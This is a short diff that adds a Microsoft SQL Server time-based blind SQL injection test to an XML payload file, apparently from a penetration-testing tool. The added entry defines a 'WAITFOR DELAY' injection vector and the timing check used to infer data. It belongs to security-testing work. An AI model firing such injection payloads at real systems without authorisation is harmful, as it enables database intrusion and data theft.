@@ -1701,6 +1701,26 @@ Formats:
     </test>
 
     <test>
+        <title>Microsoft SQL Server/Sybase AND time-based blind</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'</vector>
+        <request>
+            <payload>WAITFOR DELAY '0:0:[SLEEPTIME]'</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+
+    <test>
         <title>Microsoft SQL Server/Sybase AND time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>2</level>
